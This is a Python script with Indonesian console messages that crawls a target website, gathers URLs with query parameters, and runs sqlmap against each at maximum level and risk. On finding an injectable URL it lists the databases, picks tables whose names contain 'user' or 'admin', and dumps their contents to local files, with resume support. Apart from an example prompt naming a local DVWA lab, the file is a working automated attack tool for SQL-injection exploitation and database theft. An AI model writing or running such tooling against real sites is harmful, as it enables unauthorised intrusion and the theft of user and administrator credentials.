import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess
import re
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

CRAWL_LIMIT = 100
MAX_THREADS = 5
SQLMAP_PATH = "sqlmap"

VISITED = set()
URLS_WITH_PARAMS = []

os.makedirs("hasil_dump", exist_ok=True)

def crawl(url, target_domain):
    if len(VISITED) >= CRAWL_LIMIT or url in VISITED:
        return
    try:
        r = requests.get(url, timeout=5)
    except:
        return
    VISITED.add(url)
    print(f"[Crawl] {url}")

    soup = BeautifulSoup(r.text, "html.parser")
    for a in soup.find_all("a", href=True):
        link = urljoin(url, a["href"])
        parsed = urlparse(link)
        if target_domain in link and link not in VISITED:
            if parsed.query:
                URLS_WITH_PARAMS.append(link)
            crawl(link, target_domain)

def run_sqlmap(cmd):
    cmd.extend(["--resume"])
    return subprocess.run(cmd, capture_output=True, text=True).stdout

def save_log(target, db, table, data):
    safe_target = target.replace("http://", "").replace("https://", "").replace("/", "_")
    filename = f"hasil_dump/{safe_target}_{db}_{table}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(data)
    print(f"[+] Hasil dump tersimpan di {filename}")

def test_sqlmap(url):
    if url in tested_urls:
        print(f"[SKIP] {url} sudah diuji sebelumnya.")
        return

    print(f"\n[+] Menguji: {url}")
    output = run_sqlmap([
        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--random-agent"
    ])

    tested_urls.add(url)
    save_tested_urls()

    if re.search(r"the back-end DBMS", output, re.IGNORECASE):
        print(f"[!!!] Rentan SQLi: {url}")
        find_user_admin_tables(url)
    else:
        print(f"[-] Tidak rentan: {url}")

def find_user_admin_tables(url):
    db_list = run_sqlmap([SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--dbs"])
    databases = re.findall(r"[*]\s+(\w+)", db_list)

    for db in databases:
        tables_out = run_sqlmap([SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "-D", db, "--tables"])
        tables = re.findall(r"[*]\s+(\w+)", tables_out)
        for table in tables:
            if "user" in table.lower() or "admin" in table.lower():
                print(f"[+] Tabel target ditemukan: {db}.{table}")
                dump_out = run_sqlmap([
                    SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "-D", db, "-T", table, "--dump"
                ])
                save_log(url, db, table, dump_out)

def save_urls_found():
    with open("urls_found.txt", "w", encoding="utf-8") as f:
        for url in URLS_WITH_PARAMS:
            f.write(url + "\n")

def load_urls_found():
    if os.path.exists("urls_found.txt"):
        with open("urls_found.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    return []

def save_tested_urls():
    with open("tested_urls.txt", "w", encoding="utf-8") as f:
        for url in tested_urls:
            f.write(url + "\n")

def load_tested_urls():
    if os.path.exists("tested_urls.txt"):
        with open("tested_urls.txt", "r", encoding="utf-8") as f:
            return set(line.strip() for line in f if line.strip())
    return set()

if __name__ == "__main__":
    TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
    if not TARGET.startswith("http"):
        print("[!] URL harus diawali http:// atau https://")
        exit()

    TARGET_DOMAIN = urlparse(TARGET).netloc

    URLS_WITH_PARAMS = load_urls_found()
    tested_urls = load_tested_urls()

    if URLS_WITH_PARAMS:
        print(f"[Resume] Memuat {len(URLS_WITH_PARAMS)} URL dari urls_found.txt")
    else:
        print("[*] Mulai crawling...")
        crawl(TARGET, TARGET_DOMAIN)
        save_urls_found()

    print(f"\n[!] Total URL dengan parameter ditemukan: {len(URLS_WITH_PARAMS)}")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(test_sqlmap, url) for url in URLS_WITH_PARAMS]
        for future in as_completed(futures):
            future.result()
